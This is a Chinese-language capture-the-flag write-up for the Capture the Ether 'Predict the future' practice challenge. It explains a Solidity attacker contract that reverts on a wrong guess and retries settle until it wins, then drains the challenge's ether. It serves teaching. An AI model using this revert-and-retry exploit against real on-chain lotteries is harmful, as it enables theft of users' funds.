# Predict the future

## 题目描述

[原题链接](https://capturetheether.com/challenges/lotteries/predict-the-future/)

原题目要求 PredictTheFutureChallenge 合约的 ether 余额为 0。参与过程分成两步，第一步时锁定答案，第二步揭示答案。如果锁定的答案等于当前揭示答案是用 blockhash 以及 timestamp 通过 hash 生成的数，即可转移 2 ether 出去。

## 运行

**安装 Foundry**

根据[Foundry 官方文档](https://getfoundry.sh/)配置好运行环境。

**运行测试**

```sh
$ cd WTF-CTF

$ forge test -C src/Capture_the_Ether/Lotteries/Predict_the_future -vvv
```

## 功能简述

在 PredictTheFutureChallenge 合约中，锁定猜测 lockInGuess 和揭示答案 settle 分成了两步，并且要求 settle 的调用需要在 lockInGuess 两个区块之后。settle 如果执行成功，guesser 会被置为 address(0)，这样就无法再次调用 settle。

解决思路是，我们确实需要老老实实调用 lockInGuess 并转入一个 ether。但是在调用 settle 的时候，如果我们的 answer 不正确，我们需要能够 revert 这个 transaction，这样 guesser 不会被置为 address(0)，然后我们可以再次调用 settle，这样一直执行下去直到 answer 等于 guess。而且因为 answer 的空间是 0 - 10，每次尝试有 1/10 的成功概率，是具有可能性的。

Attacker 合约中，lockInGuess，我们先调用 PredictTheFutureChallenge 的 lockInGuess，设置一个空间内的数，比如 6。然后过了两个块后，我们可以调用 Attacker 的 attack，如果挑战失败，revert 整个 transaction。然后再次尝试，直到成功后将所有的余额发送到 balance。

```solidity
    function lockInGuess(uint8 n) external payable {
        if (msg.sender != owner) revert NotOwner();
        if (address(this).balance < 1 ether) revert ValueErr();
        
        challenge.lockInGuess{value: 1 ether}(n);
    }
    
    function attack() external {
        if (msg.sender != owner) revert NotOwner();

        challenge.settle();
    
        // if we guessed wrong, revert
        if (!challenge.isComplete()) revert GuessErr();
        // return all of it to EOA
        payable(tx.origin).transfer(address(this).balance);
    }
```
